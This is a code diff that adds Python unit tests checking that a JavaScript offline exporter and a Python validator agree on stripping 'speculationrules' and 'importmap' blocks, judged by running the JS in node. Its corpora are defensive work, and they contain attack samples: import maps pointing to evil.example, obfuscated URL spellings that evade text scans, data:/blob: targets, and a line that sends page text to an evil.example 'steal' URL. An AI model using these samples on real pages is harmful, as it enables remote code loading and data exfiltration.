@@ -1342,6 +1342,166 @@ class RuntimeParityTests(unittest.TestCase):
                 % value)
 
 
+    # (type, attrs, body) tuples the exporter REMOVES and the validator rejects.
+    _ACTIVE_DATA_REMOVED = [
+        # A ruleset goes whatever it says: `"source": "document"` prefetches the document's own
+        # links with no URL literal, so no URL-shaped rule could gate one.
+        ("speculationrules", {}, '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
+        ("speculationrules", {}, '{"prefetch": [{"source": "document"}]}'),
+        ("speculationrules", {}, '{"prerender": [{"urls": ["next.html"]}]}'),
+        ("speculationrules", {"src": "rules.json"}, ""),
+        ("importmap", {}, '{"imports": {"lib": "https://evil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "//evil.example/lib.js"}}'),
+        # A backslash opens an authority for a special scheme exactly as a slash does, in either
+        # position, and from a `file:` document that is a UNC fetch.
+        ("importmap", {}, '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "\\\\/evil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "\\\\\\\\evil.example/lib.js"}}'),
+        # JSON spells the same URL many ways, and the URL parser strips padding and an embedded
+        # tab, so a text scan closes one spelling and leaves the rest.
+        ("importmap", {}, '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
+        # A data:/blob: target maps a bare specifier onto code the document never carried.
+        ("importmap", {}, '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
+        ("importmap", {}, '{"imports": {"lib": "blob:https://evil.example/x"}}'),
+        # A scopes KEY is a reference too.
+        ("importmap", {}, '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
+        ("importmap", {"src": "map.json"}, '{"imports": {"lib": "./lib.js"}}'),
+        # A browser hard-fails an unparseable map, so failing closed loses nothing. Python's json
+        # accepts NaN/Infinity by default and JSON.parse does not, so those must fail closed too.
+        ("importmap", {}, "not json at all"),
+        ("importmap", {}, ""),
+        ("importmap", {}, '{"imports": {"lib": NaN}}'),
+    ]
+    # ...and the ones both must KEEP, so the rule cannot quietly become "delete every block".
+    _ACTIVE_DATA_KEPT = [
+        ("importmap", {}, '{"imports": {"lib": "./lib.js", "app": "/app.js"}}'),
+        ("importmap", {}, '{"imports": {"lib": "../vendor/lib.js"}}'),
+        # A `//` that does not START the reference is not an authority.
+        ("importmap", {}, '{"imports": {"a": "./b//c.js"}}'),
+        ("importmap", {}, '{"scopes": {"/inner/": {"lib": "./inner.js"}}}'),
+        ("importmap", {}, "{}"),
+    ]
+    # Type normalization: these are HTML KEYWORD types, not MIME types, so a browser matches them
+    # exactly after trimming ASCII whitespace. A parameterized spelling is inert data.
+    _ACTIVE_DATA_TYPE_CASES = [
+        ("importmap", "importmap"),
+        ("  IMPORTMAP\t", "importmap"),
+        ("speculationrules", "speculationrules"),
+        ("SpeculationRules", "speculationrules"),
+        ("importmap;charset=utf-8", ""),
+        ("speculationrules; x=1", ""),
+        ("module", ""),
+        ("application/json", ""),
+        ("text/javascript", ""),
+        ("", ""),
+    ]
+
+    def _runtime_active_data_source(self):
+        """The exporter's whole active-data decision, as JS source, for evaluation in node.
+
+        Extracted as one contiguous region rather than re-implemented: the decision is four parts
+        (type normalization, the `src` rule, the JSON parse and the recursive walk), and a Python
+        re-implementation would keep passing after any of them drifted - which is exactly the drift
+        the parity test exists to catch.
+        """
+        source = self._read("68-export-offline.js")
+        start = source.find("const _OFFLINE_ACTIVE_DATA_TYPES = [")
+        self.assertNotEqual(start, -1,
+                            "the runtime no longer defines _OFFLINE_ACTIVE_DATA_TYPES; the parity "
+                            "extraction is stale")
+        end = source.find("function _offlineActiveDataBlockIsRemovable(", start)
+        self.assertNotEqual(end, -1,
+                            "the runtime no longer defines _offlineActiveDataBlockIsRemovable "
+                            "after the type list; the parity extraction is stale")
+        end = source.find("\n}", end)
+        self.assertNotEqual(end, -1, "could not find the end of _offlineActiveDataBlockIsRemovable")
+        region = source[start:end + 2]
+        for name in ("_offlineActiveDataScriptType", "_OFFLINE_NONLOCAL_REF_RE",
+                     "_offlineIsNonLocalRef", "_offlineJsonHasNonLocalRef"):
+            self.assertIn(name, region,
+                          "%s is no longer inside the extracted active-data region, so the parity "
+                          "check would run a partial copy of the decision" % name)
+        return region
+
+    def test_the_python_and_js_active_data_block_rules_agree(self):
+        """The offline strip (JS) and the strict validator (Python) must treat `speculationrules`
+        and `importmap` blocks identically, judged by running the REAL JS.
+
+        Neither type is JavaScript, so the runnable-type predicate never looked at either - yet a
+        speculation ruleset makes the browser fetch on its own (a `"source": "document"` one names
+        no URL at all, which is why it is removed unconditionally) and an import map re-points
+        where a bare module specifier resolves, which the literal `import "https://..."` scan
+        structurally cannot see. Two independent copies of the rule are exactly the drift the
+        runnable-script-type parity test exists for: a validator that recognized less would bless a
+        file the exporter strips, and one that recognized more would reject the file it just
+        produced. Both directions are pinned - a removed corpus AND a kept corpus - so the rule can
+        neither weaken into "nothing is active" nor widen into "delete every block". The exporter's
+        own source is evaluated in node, because compiling it with Python's `re`/`json` could only
+        ever prove what PYTHON does with it and structurally cannot catch an engine difference.
+        """
+        self.assertEqual(
+            tuple(re.findall(r'"([^"]+)"',
+                             re.search(r"^const _OFFLINE_ACTIVE_DATA_TYPES = \[(.+?)\];$",
+                                       self._read("68-export-offline.js"), re.MULTILINE).group(1))),
+            tuple(resources.OFFLINE_ACTIVE_DATA_TYPES),
+            "the exporter's _OFFLINE_ACTIVE_DATA_TYPES and the validator's "
+            "OFFLINE_ACTIVE_DATA_TYPES have diverged - a type only one of them knows about is "
+            "either an unstripped active block the gate blesses, or a false rejection")
+        for raw, expected in self._ACTIVE_DATA_TYPE_CASES:
+            self.assertEqual(resources.offline_active_data_script_type({"type": raw}), expected,
+                             "the validator normalizes the script type %r wrongly" % raw)
+        for stype, attrs, body in self._ACTIVE_DATA_REMOVED:
+            self.assertTrue(resources.offline_active_data_block_is_removable(stype, attrs, body),
+                            "the validator no longer rejects %r %r %r" % (stype, attrs, body))
+        for stype, attrs, body in self._ACTIVE_DATA_KEPT:
+            self.assertFalse(resources.offline_active_data_block_is_removable(stype, attrs, body),
+                             "the validator now rejects the local block %r %r %r" % (stype, attrs, body))
+
+        node = shutil.which("node")
+        if not node:
+            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
+        payload = {
+            "types": [raw for raw, _ in self._ACTIVE_DATA_TYPE_CASES],
+            "removed": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_REMOVED],
+            "kept": [[t, sorted(a), b] for t, a, b in self._ACTIVE_DATA_KEPT],
+        }
+        script = (
+            self._runtime_active_data_source() + "\n"
+            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
+            "const p=JSON.parse(raw);"
+            "const el=(attrs,body)=>({hasAttribute:(n)=>attrs.indexOf(n)!==-1,textContent:body});"
+            "const decide=([t,attrs,body])=>{const k=_offlineActiveDataScriptType(t);"
+            "return k?_offlineActiveDataBlockIsRemovable(k,el(attrs,body)):null;};"
+            "process.stdout.write(JSON.stringify({"
+            "types:p.types.map(_offlineActiveDataScriptType),"
+            "removed:p.removed.map(decide),kept:p.kept.map(decide)}));});"
+        )
+        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
+                              capture_output=True, text=True, encoding="utf-8")
+        self.assertEqual(proc.returncode, 0,
+                         "node could not evaluate the active-data decision: %s" % proc.stderr)
+        verdicts = json.loads(proc.stdout)
+        # Length-check before zipping: `zip` truncates silently, so a short list would let this
+        # pass having asserted nothing.
+        for key, corpus in (("types", self._ACTIVE_DATA_TYPE_CASES),
+                            ("removed", self._ACTIVE_DATA_REMOVED),
+                            ("kept", self._ACTIVE_DATA_KEPT)):
+            self.assertEqual(len(verdicts.get(key, [])), len(corpus),
+                             "node returned %d %s verdicts for %d samples"
+                             % (len(verdicts.get(key, [])), key, len(corpus)))
+        for (raw, expected), got in zip(self._ACTIVE_DATA_TYPE_CASES, verdicts["types"]):
+            self.assertEqual(got, expected,
+                             "the REAL JS engine normalizes the script type %r to %r, and the "
+                             "validator to %r" % (raw, got, expected))
+        for sample, hit in zip(self._ACTIVE_DATA_REMOVED, verdicts["removed"]):
+            self.assertTrue(hit, "the REAL JS engine no longer removes %r, so the exporter ships a "
+                                 "block the Python validator rejects" % (sample,))
+        for sample, hit in zip(self._ACTIVE_DATA_KEPT, verdicts["kept"]):
+            self.assertFalse(hit, "the REAL JS engine now deletes the local block %r" % (sample,))
+
     _NAV_CORPUS_NAVIGATES = [
         'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
         "\nlocation = 'https://evil.example';",
